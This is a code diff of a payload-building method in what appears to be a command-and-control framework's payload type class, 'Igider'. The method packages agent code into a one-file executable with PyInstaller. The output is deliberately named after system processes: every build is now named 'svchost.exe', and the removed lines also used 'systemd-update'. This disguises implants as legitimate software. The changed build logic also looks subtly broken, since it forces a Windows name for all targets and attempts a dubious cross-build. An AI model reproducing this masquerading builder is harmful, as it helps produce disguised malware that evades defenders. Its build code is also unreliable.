@@ -232,56 +232,39 @@ class Igider(PayloadType):
     
 
     def _build_executable(self, code: str, target_os: str) -> bytes:
-        # Check if PyInstaller is available
-        try:
-            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], 
-                        capture_output=True, check=True)
-        except (subprocess.CalledProcessError, FileNotFoundError):
-            raise Exception("PyInstaller is not installed")
-
         with tempfile.TemporaryDirectory() as temp_dir:
-            # Create main Python file
+            # Write the Python code
             main_py = os.path.join(temp_dir, "main.py")
             with open(main_py, "w") as f:
                 f.write(code)
 
-            # Build command for cross-compilation
-            exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
+            # PyInstaller command for Windows EXE
             cmd = [
                 sys.executable, "-m", "PyInstaller",
                 "--onefile",
-                "--name", exe_name,
+                "--name", "svchost.exe",  # Force .exe extension
                 "--distpath", os.path.join(temp_dir, "dist"),
                 "--workpath", os.path.join(temp_dir, "build"),
                 "--specpath", temp_dir,
-                "--console" if target_os != "windows" else "--windowed",
+                "--console",  # Or "--windowed" for no console
+                "--clean",
+                "--target-arch", "64bit",  # Explicit 64-bit
+                "--paths", "/usr/x86_64-w64-mingw32/lib",  # Mingw DLLs
                 main_py
             ]
 
-            if target_os == "windows":
-                cmd.extend(["--target-arch", "64bit"])
-
+            # Run PyInstaller
             try:
-                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
-                result = subprocess.run(
-                    cmd, 
-                    capture_output=True, 
-                    text=True, 
-                    cwd=temp_dir,
-                    timeout=300
-                )
-
-                if result.returncode != 0:
-                    raise Exception(f"PyInstaller failed: {result.stderr}")
-
-                # Find the generated executable
-                exe_path = os.path.join(temp_dir, "dist", exe_name)
+                subprocess.run(cmd, check=True, cwd=temp_dir, timeout=300)
+                exe_path = os.path.join(temp_dir, "dist", "svchost.exe")
+                
+                # Verify the EXE is a valid Windows binary
                 if not os.path.exists(exe_path):
-                    raise Exception(f"Executable not found at {exe_path}")
-
+                    raise Exception("EXE not found!")
+                
+                # Read and return the binary
                 with open(exe_path, "rb") as f:
                     return f.read()
-
             except Exception as e:
                 raise Exception(f"Build failed: {str(e)}")
 
